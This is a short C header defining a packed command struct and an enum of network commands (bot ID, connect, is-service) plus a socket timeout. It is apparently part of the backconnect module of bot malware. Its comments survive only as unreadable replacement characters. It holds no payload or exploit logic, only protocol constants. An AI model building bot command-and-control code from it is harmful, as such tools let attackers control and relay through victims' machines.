#ifndef NET_H_INCLUDED
#define NET_H_INCLUDED

#include <pshpack1.h>
__declspec(align(1)) struct BC_COMMAND
{
    WORD wStructSize;
    WORD wDataSize;
    byte bCommand;
};
#include <poppack.h>

enum
{
    COMMAND_UNKNOWN,    //������.
    COMMAND_BOTID,      //��������� �����. ����������, ����� ��������� ��������� ������ ��������
                        //wDataSize, ������� ID ����. ����� ��������, ��� ������ ���������� ��������
                        //�����������.
    COMMAND_CONNECT,    //���������� ��������. �������� ������ ���������� � bc ��������. ����� �
                        //���� DWORD ��� ���������� ID ��� ����������.
    COMMAND_IS_SERVICE, //��������� �����. �������� � ���, ��� ������ ���������� �������� ���������,
                        //����� � ���� DWORD ��������� �� COMMAND_CONNECT.
};

#define SOCKET_TIMEOUT 30*1000

#endif // NET_H_INCLUDED
